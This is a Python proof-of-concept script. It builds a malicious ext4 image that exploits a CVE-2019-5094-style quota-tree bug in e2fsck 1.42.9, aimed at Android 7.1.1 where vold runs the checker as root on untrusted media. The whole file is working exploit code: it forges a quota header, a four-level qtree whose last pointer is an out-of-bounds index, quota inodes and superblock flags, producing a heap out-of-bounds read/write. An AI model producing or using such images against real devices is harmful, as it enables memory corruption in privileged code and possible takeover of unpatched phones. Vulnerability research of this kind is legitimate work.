#!/usr/bin/env python3
"""ext4_quota_poc.py - craft a CVE-2019-5094-style ext4 quota image.

Makes e2fsck 1.42.9 (Android 7.1.1 / KEYone) walk the qtree in report_tree()
into get_bit(bitmap, blk) with blk far beyond the bitmap: OOB read/write on the
heap in the root-executed quota code (vold runs e2fsck -y on untrusted media).

Usage: py tools/ext4_quota_poc.py seed.ext4 poc.ext4 [--blk 0x40000000]
"""
import argparse
import struct

DQF_MAGIC = 0x28CD3D45
QT_TREEOFF = 2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("seed")
    ap.add_argument("out")
    ap.add_argument("--blk", type=lambda s: int(s, 0), default=0x40000000)
    ap.add_argument("--quota-blocks", default="4500,4501,4502,4503,4504,4505")
    args = ap.parse_args()

    d = bytearray(open(args.seed, "rb").read())
    sb = 1024
    bsize = 1024 << struct.unpack_from("<I", d, sb + 0x18)[0]
    ipg = struct.unpack_from("<I", d, sb + 0x28)[0]
    isize = struct.unpack_from("<H", d, sb + 0x58)[0] or 128
    gdt = (struct.unpack_from("<I", d, sb + 0x14)[0] + 1) * bsize
    itable = struct.unpack_from("<I", d, gdt + 8)[0] * bsize

    B = [int(x) for x in args.quota_blocks.split(",")]

    # quota file content: header+dqinfo in block0, qtree in blocks 2..5
    d[B[0] * bsize:(B[0] + 1) * bsize] = b"\x00" * bsize
    struct.pack_into("<II", d, B[0] * bsize, DQF_MAGIC, 1)
    struct.pack_into("<IIIIII", d, B[0] * bsize + 8,
                     604800, 604800, 0, 8, 0, 0)  # bgrace, igrace, flags, dqi_blocks=8, ...
    for i in range(2, 6):
        base = B[i] * bsize
        d[base:base + bsize] = b"\x00" * bsize
    struct.pack_into("<I", d, B[2] * bsize, 3)   # depth0 -> blk 3
    struct.pack_into("<I", d, B[3] * bsize, 4)   # depth1 -> blk 4
    struct.pack_into("<I", d, B[4] * bsize, 5)   # depth2 -> blk 5
    struct.pack_into("<I", d, B[5] * bsize, args.blk)  # depth3 -> OOB index

    def mk_inode(num):
        off = itable + (num - 1) * isize
        e = bytearray(isize)
        struct.pack_into("<H", e, 0x00, 0x8180)   # regular file
        struct.pack_into("<I", e, 0x04, 6 * bsize)  # size
        struct.pack_into("<H", e, 0x1A, 1)        # links
        struct.pack_into("<I", e, 0x1C, 24 * bsize // 512)
        struct.pack_into("<I", e, 0x28 + 0 * 4, B[0])
        struct.pack_into("<I", e, 0x28 + 2 * 4, B[2])
        struct.pack_into("<I", e, 0x28 + 3 * 4, B[3])
        struct.pack_into("<I", e, 0x28 + 4 * 4, B[4])
        struct.pack_into("<I", e, 0x28 + 5 * 4, B[5])
        d[off:off + isize] = e

    mk_inode(3)  # user quota
    mk_inode(4)  # group quota

    ro = struct.unpack_from("<I", d, sb + 0x64)[0]
    struct.pack_into("<I", d, sb + 0x64, ro | 0x100)  # RO_COMPAT_QUOTA
    struct.pack_into("<I", d, sb + 0x244, 3)          # s_usr_quota_inum
    struct.pack_into("<I", d, sb + 0x248, 4)          # s_grp_quota_inum
    _ = ipg
    open(args.out, "wb").write(d)
    print("wrote %s (blk=%#x, B=%s, bsize=%d, itable=%#x)"
          % (args.out, args.blk, B, bsize, itable))


if __name__ == "__main__":
    main()
